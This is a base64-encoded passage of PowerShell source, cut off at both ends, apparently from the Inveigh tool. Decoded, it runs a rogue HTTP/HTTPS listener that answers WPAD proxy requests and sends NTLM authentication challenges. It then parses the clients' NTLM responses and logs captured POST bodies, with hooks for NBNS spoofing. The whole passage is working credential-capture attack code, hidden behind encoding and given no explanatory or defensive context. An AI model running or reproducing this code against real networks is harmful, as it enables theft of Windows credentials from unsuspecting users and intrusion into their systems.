AgICAgICAgICAgICRIVFRQX2NsZWFyX3N0cmVhbSA9ICRIVFRQX2NsaWVudC5HZXRTdHJlYW0oKQogICAgICAgICAgICAgICAgJEhUVFBfc3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkSFRUUF9jbGVhcl9zdHJlYW0sJGZhbHNlKQogICAgICAgICAgICAgICAgJFNTTF9jZXJ0ID0gKEdldC1DaGlsZEl0ZW0gQ2VydDpcTG9jYWxNYWNoaW5lXE15IHwgV2hlcmUtT2JqZWN0IHskXy5TdWJqZWN0IC1tYXRjaCAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9DTn0pCiAgICAgICAgICAgICAgICAkSFRUUF9zdHJlYW0uQXV0aGVudGljYXRlQXNTZXJ2ZXIoJFNTTF9jZXJ0LCRmYWxzZSxbU3lzdGVtLlNlY3VyaXR5LkF1dGhlbnRpY2F0aW9uLlNzbFByb3RvY29sc106OkRlZmF1bHQsJGZhbHNlKQogICAgICAgICAgICB9CgogICAgICAgICAgICBbQnl0ZVtdXSRTU0xfcmVxdWVzdF9ieXRlcyA9ICRudWxsCgogICAgICAgICAgICBkbyAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfcmVxdWVzdF9ieXRlX2NvdW50ID0gJEhUVFBfc3RyZWFtLlJlYWQoJFRDUF9yZXF1ZXN0X2J5dGVzLDAsJFRDUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCkKICAgICAgICAgICAgICAgICRTU0xfcmVxdWVzdF9ieXRlcyArPSAkVENQX3JlcXVlc3RfYnl0ZXNbMC4uKCRIVFRQX3JlcXVlc3RfYnl0ZV9jb3VudCAtIDEpXQogICAgICAgICAgICB9IHdoaWxlICgkSFRUUF9jbGVhcl9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKCiAgICAgICAgICAgICRUQ1BfcmVxdWVzdCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNTTF9yZXF1ZXN0X2J5dGVzKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewoKICAgICAgICAgICAgaWYoISRIVFRQX2NsaWVudC5Db25uZWN0ZWQgLW9yICRIVFRQX2NsaWVudF9jbG9zZSAtYW5kICRpbnZlaWdoLnJ1bm5pbmcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudCA9ICRIVFRQX2xpc3RlbmVyLkFjY2VwdFRjcENsaWVudCgpIAoJICAgICAgICAgICAgJEhUVFBfc3RyZWFtID0gJEhUVFBfY2xpZW50LkdldFN0cmVhbSgpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRIVFRQX3N0cmVhbS5EYXRhQXZhaWxhYmxlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9kYXRhX2F2YWlsYWJsZSA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9kYXRhX2F2YWlsYWJsZSA9ICRmYWxzZQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkSFRUUF9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfc3RyZWFtLlJlYWQoJFRDUF9yZXF1ZXN0X2J5dGVzLDAsJFRDUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFRDUF9yZXF1ZXN0ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkVENQX3JlcXVlc3RfYnl0ZXMpCiAgICAgICAgfQoKICAgICAgICBpZigkVENQX3JlcXVlc3QgLWxpa2UgIjQ3LTQ1LTU0LTIwKiIgLW9yICRUQ1BfcmVxdWVzdCAtbGlrZSAiNDgtNDUtNDEtNDQtMjAqIiAtb3IgJFRDUF9yZXF1ZXN0IC1saWtlICI0Zi01MC01NC00OS00Zi00ZS01My0yMCoiIC1vciAkVENQX3JlcXVlc3QgLWxpa2UgIjQzLTRmLTRlLTRlLTQ1LTQzLTU0KiIgLW9yICRUQ1BfcmVxdWVzdCAtbGlrZSAiNTAtNGYtNTMtNTQqIikKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX3Jhd19VUkwgPSAkVENQX3JlcXVlc3QuU3Vic3RyaW5nKCRUQ1BfcmVxdWVzdC5JbmRleE9mKCItMjAtIikgKyA0LCRUQ1BfcmVxdWVzdC5TdWJzdHJpbmcoJFRDUF9yZXF1ZXN0LkluZGV4T2YoIi0yMC0iKSArIDEpLkluZGV4T2YoIi0yMC0iKSAtIDMpCiAgICAgICAgICAgICRIVFRQX3Jhd19VUkwgPSAkSFRUUF9yYXdfVVJMLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgJEhUVFBfcmVxdWVzdF9yYXdfVVJMID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyaW5nICgkSFRUUF9yYXdfVVJMLDAsJEhUVFBfcmF3X1VSTC5MZW5ndGgpCiAgICAgICAgICAgICRIVFRQX3NvdXJjZV9JUCA9ICRIVFRQX2NsaWVudC5DbGllbnQuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZwoKICAgICAgICAgICAgaWYoJE5CTlNCcnV0ZUZvcmNlUGF1c2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5CTlNfc3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5ob3N0bmFtZV9zcG9vZiA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCRUQ1BfcmVxdWVzdCAtbGlrZSAiKi00OC02Ri03My03NC0zQS0yMC0qIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdCA9ICRUQ1BfcmVxdWVzdC5TdWJzdHJpbmcoJFRDUF9yZXF1ZXN0LkluZGV4T2YoIi00OC02Ri03My03NC0zQS0yMC0iKSArIDE5KQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdCA9ICRIVFRQX2hlYWRlcl9ob3N0X2V4dHJhY3QuU3Vic3RyaW5nKDAsJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdC5JbmRleE9mKCItMEQtMEEtIikpCiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfaG9zdF9leHRyYWN0ID0gJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfaG9zdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdCwwLCRIVFRQX2hlYWRlcl9ob3N0X2V4dHJhY3QuTGVuZ3RoKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkVENQX3JlcXVlc3QgLWxpa2UgIiotNTUtNzMtNjUtNzItMkQtNDEtNjctNjUtNkUtNzQtM0EtMjAtKiIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QgPSAkVENQX3JlcXVlc3QuU3Vic3RyaW5nKCRUQ1BfcmVxdWVzdC5JbmRleE9mKCItNTUtNzMtNjUtNzItMkQtNDEtNjctNjUtNkUtNzQtM0EtMjAtIikgKyAzNykKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QgPSAkSFRUUF9oZWFkZXJfdXNlcl9hZ2VudF9leHRyYWN0LlN1YnN0cmluZygwLCRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QuSW5kZXhPZigiLTBELTBBLSIpKQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnRfZXh0cmFjdCA9ICRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcgKCRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QsMCwkSFRUUF9oZWFkZXJfdXNlcl9hZ2VudF9leHRyYWN0Lkxlbmd0aCkKCiAgICAgICAgICAgICAgICBpZigkSFRUUFJlc2V0RGVsYXkuQ291bnQgLWd0IDAgLWFuZCAoJEhUVFBSZXNldERlbGF5IHwgV2hlcmUtT2JqZWN0IHskSFRUUF9oZWFkZXJfdXNlcl9hZ2VudCAtbWF0Y2ggJF99KSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXNldF9kZWxheSA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfcmVzZXRfZGVsYXlfdGltZW91dCA9IE5ldy1UaW1lU3BhbiAtU2Vjb25kcyAkSFRUUFJlc2V0RGVsYXlUaW1lb3V0CiAgICAgICAgICAgICAgICAgICAgJEhUVFBfcmVzZXRfZGVsYXlfc3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkSFRUUF9yZXF1ZXN0X3Jhd19VUkxfb2xkIC1uZSAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgLW9yICRIVFRQX2NsaWVudF9oYW5kbGVfb2xkIC1uZSAkSFRUUF9jbGllbnQuQ2xpZW50LkhhbmRsZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSByZXF1ZXN0IGZvciAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBob3N0IGhlYWRlciAkSFRUUF9oZWFkZXJfaG9zdCByZWNlaXZlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHVzZXIgYWdlbnQgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVBgOmBuJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQiKQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHJlcXVlc3QgZm9yICRIVFRQX3JlcXVlc3RfcmF3X1VSTCByZWNlaXZlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgaG9zdCBoZWFkZXIgJEhUVFBfaGVhZGVyX2hvc3QgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHVzZXIgYWdlbnQgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHJlcXVlc3QgZm9yICRIVFRQX3JlcXVlc3RfcmF3X1VSTCByZWNlaXZlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIGhvc3QgaGVhZGVyICRIVFRQX2hlYWRlcl9ob3N0IHJlY2VpdmVkIGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdXNlciBhZ2VudCAkSFRUUF9oZWFkZXJfdXNlcl9hZ2VudCByZWNlaXZlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJFByb3h5IC1lcSAnWScgLWFuZCAkUHJveHlJZ25vcmUuQ291bnQgLWd0IDAgLWFuZCAoJFByb3h5SWdub3JlIHwgV2hlcmUtT2JqZWN0IHskSFRUUF9oZWFkZXJfdXNlcl9hZ2VudCAtbWF0Y2ggJF99KSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIGlnbm9yaW5nIHdwYWQuZGF0IHJlcXVlc3QgZHVlIHRvIHVzZXIgYWdlbnQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQoKICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIGlnbm9yaW5nIHdwYWQuZGF0IHJlcXVlc3QgZHVlIHRvIHVzZXIgYWdlbnQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBpZ25vcmluZyB3cGFkLmRhdCByZXF1ZXN0IGR1ZSB0byB1c2VyIGFnZW50IGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFRDUF9yZXF1ZXN0IC1saWtlICIqLTQxLTc1LTc0LTY4LTZGLTcyLTY5LTdBLTYxLTc0LTY5LTZGLTZFLTNBLTIwLSoiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbl9leHRyYWN0ID0gJFRDUF9yZXF1ZXN0LlN1YnN0cmluZygkVENQX3JlcXVlc3QuSW5kZXhPZigiLTQxLTc1LTc0LTY4LTZGLTcyLTY5LTdBLTYxLTc0LTY5LTZGLTZFLTNBLTIwLSIpICsgNDYpCiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbl9leHRyYWN0ID0gJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdC5TdWJzdHJpbmcoMCwkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbl9leHRyYWN0LkluZGV4T2YoIi0wRC0wQS0iKSkKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uX2V4dHJhY3QgPSAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbl9leHRyYWN0LlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyaW5nICgkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbl9leHRyYWN0LDAsJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdC5MZW5ndGgpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCgkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgLW5vdG1hdGNoICcvd3BhZC5kYXQnIC1hbmQgJEhUVFBBdXRoIC1lcSAnQW5vbnltb3VzJykgLW9yICgkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgLW1hdGNoICcvd3BhZC5kYXQnIC1hbmQgJFdQQURBdXRoIC1lcSAnQW5vbnltb3VzJykgLW9yICgKICAgICAgICAgICAgJEhUVFBfcmVxdWVzdF9yYXdfVVJMIC1tYXRjaCAnL3dwYWQuZGF0JyAtYW5kICRXUEFEQXV0aCAtbGlrZSAnTlRMTSonIC1hbmQgJFdQQURBdXRoSWdub3JlLkNvdW50IC1ndCAwIC1hbmQgKCRXUEFEQXV0aElnbm9yZSB8IFdoZXJlLU9iamVjdCB7JEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgLW1hdGNoICRffSkpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZV9zdGF0dXNfY29kZSA9IDB4MzIsMHgzMCwweDMwCiAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZV9waHJhc2UgPSAweDRmLDB4NGIKICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudF9jbG9zZSA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYoKCRIVFRQX3JlcXVlc3RfcmF3X3VybCAtbWF0Y2ggJy93cGFkLmRhdCcgLWFuZCAkV1BBREF1dGggLWVxICdOVExNJykgLW9yICgkSFRUUF9yZXF1ZXN0X3Jhd191cmwgLW5vdG1hdGNoICcvd3BhZC5kYXQnIC1hbmQgJEhUVFBBdXRoIC1lcSAnTlRMTScpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQTlRMTUVTUyA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEhUVFBOVExNRVNTID0gJGZhbHNlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJHByb3h5X2xpc3RlbmVyKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX3Jlc3BvbnNlX3N0YXR1c19jb2RlID0gMHgzNCwweDMwLDB4MzcKICAgICAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aGVudGljYXRlID0gMHg1MCwweDcyLDB4NmYsMHg3OCwweDc5LDB4MmQsMHg0MSwweDc1LDB4NzQsMHg2OCwweDY1LDB4NmUsMHg3NCwweDY5LDB4NjMsMHg2MSwweDc0LDB4NjUsMHgzYSwweDIwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2Vfc3RhdHVzX2NvZGUgPSAweDM0LDB4MzAsMHgzMQogICAgICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGUgPSAweDU3LDB4NTcsMHg1NywweDJkLDB4NDEsMHg3NSwweDc0LDB4NjgsMHg2NSwweDZlLDB4NzQsMHg2OSwweDYzLDB4NjEsMHg3NCwweDY1LDB4M2EsMHgyMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZV9waHJhc2UgPSAweDU1LDB4NmUsMHg2MSwweDc1LDB4NzQsMHg2OCwweDZmLDB4NzIsMHg2OSwweDdhLDB4NjUsMHg2NAogICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50X2Nsb3NlID0gJGZhbHNlCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRUQ1BfcmVxdWVzdCAtbGlrZSAiNTAtNGYtNTMtNTQqIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfUE9TVF9yZXF1ZXN0X2V4dHJhY3QgPSAkVENQX3JlcXVlc3QuU3Vic3RyaW5nKCRUQ1BfcmVxdWVzdC5JbmRleE9mKCItMEQtMEEtMEQtMEEtIikgKyAxMikKICAgICAgICAgICAgICAgICRIVFRQX1BPU1RfcmVxdWVzdF9leHRyYWN0ID0gJEhUVFBfUE9TVF9yZXF1ZXN0X2V4dHJhY3QuU3Vic3RyaW5nKDAsJEhUVFBfUE9TVF9yZXF1ZXN0X2V4dHJhY3QuSW5kZXhPZigiLTAwLSIpKQogICAgICAgICAgICAgICAgJEhUVFBfUE9TVF9yZXF1ZXN0X2V4dHJhY3QgPSAkSFRUUF9QT1NUX3JlcXVlc3RfZXh0cmFjdC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAkSFRUUF9QT1NUX3JlcXVlc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcgKCRIVFRQX1BPU1RfcmVxdWVzdF9leHRyYWN0LDAsJEhUVFBfUE9TVF9yZXF1ZXN0X2V4dHJhY3QuTGVuZ3RoKQoKICAgICAgICAgICAgICAgIGlmKCRIVFRQX1BPU1RfcmVxdWVzdF9vbGQgLW5lICRIVFRQX1BPU1RfcmVxdWVzdCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIFBPU1QgcmVxdWVzdCAkSFRUUF9QT1NUX3JlcXVlc3QgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlBPU1RfcmVxdWVzdF9maWxlX3F1ZXVlLkFkZCgkSFRUUF9QT1NUX3JlcXVlc3QpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guUE9TVF9yZXF1ZXN0X2xpc3QuQWRkKCRIVFRQX1BPU1RfcmVxdWVzdCkKCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSBQT1NUIHJlcXVlc3Qgd3JpdHRlbiB0byAiICsgJGludmVpZ2guUE9TVF9yZXF1ZXN0X291dF9maWxlKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBQT1NUIHJlcXVlc3QgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBQT1NUIHJlcXVlc3QgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJEhUVFBfUE9TVF9yZXF1ZXN0X29sZCA9ICRIVFRQX1BPU1RfcmVxdWVzdAogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbi5TdGFydHNXaXRoKCdOVExNICcpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uID0gJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb24gLXJlcGxhY2UgJ05UTE0gJywnJwogICAgICAgICAgICAgICAgW0J5dGVbXV0kSFRUUF9yZXF1ZXN0X2J5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbikKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRIVFRQX3JlcXVlc3RfYnl0ZXNbOC4uMTFdKSAtZXEgJzAxLTAwLTAwLTAwJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTlRMTSA9IE5UTE1DaGFsbGVuZ2VCYXNlNjQgJENoYWxsZW5nZSAkSFRUUE5UTE1FU1MgJEhUVFBfc291cmNlX0lQICRIVFRQX2NsaWVudC5DbGllbnQuUmVtb3RlRW5kcG9pbnQuUG9ydAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJEhUVFBfcmVxdWVzdF9ieXRlc1s4Li4xMV0pIC1lcSAnMDMtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fbGVuZ3RoID0gRGF0YUxlbmd0aDIgMjAgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fb2Zmc2V0ID0gRGF0YUxlbmd0aDQgMjQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGgyIDI4ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgPSBEYXRhTGVuZ3RoNCAzMiAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgW1N0cmluZ10kTlRMTV9jaGFsbGVuZ2UgPSAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZSAtbGlrZSAkSFRUUF9zb3VyY2VfSVAgKyAkSFRUUF9jbGllbnQuQ2xpZW50LlJlbW90ZUVuZHBvaW50LlBvcnQgKyAnKicKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZS5SZW1vdmUoJE5UTE1fY2hhbGxlbmdlKQogICAgICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICROVExNX2NoYWxsZW5nZS5TdWJzdHJpbmcoKCROVExNX2NoYWxsZW5nZS5JbmRleE9mKCIsIikpICsgMSkKICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZigkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgPSAiIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgeyAgCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyA9IERhdGFUb1N0cmluZyAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAg